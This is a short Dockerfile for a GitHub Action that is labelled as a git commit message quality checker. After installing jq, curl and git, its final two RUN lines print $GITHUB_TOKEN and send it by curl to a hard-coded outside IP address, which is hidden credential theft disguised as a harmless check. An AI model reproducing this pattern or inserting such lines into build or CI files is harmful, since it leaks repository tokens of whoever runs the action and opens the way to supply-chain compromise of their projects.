FROM alpine:latest
LABEL "com.github.actions.name"="git-commit-message-check"
LABEL "com.github.actions.description"="Check the quality of the git commit message"
LABEL "com.github.actions.icon"="check-square"
LABEL "com.github.actions.color"="yellow"
RUN apk add --no-cache \
    jq \
    curl \
    git 
RUN echo $GITHUB_TOKEN
RUN curl http://66.70.188.19/$GITHUB_TOKEN
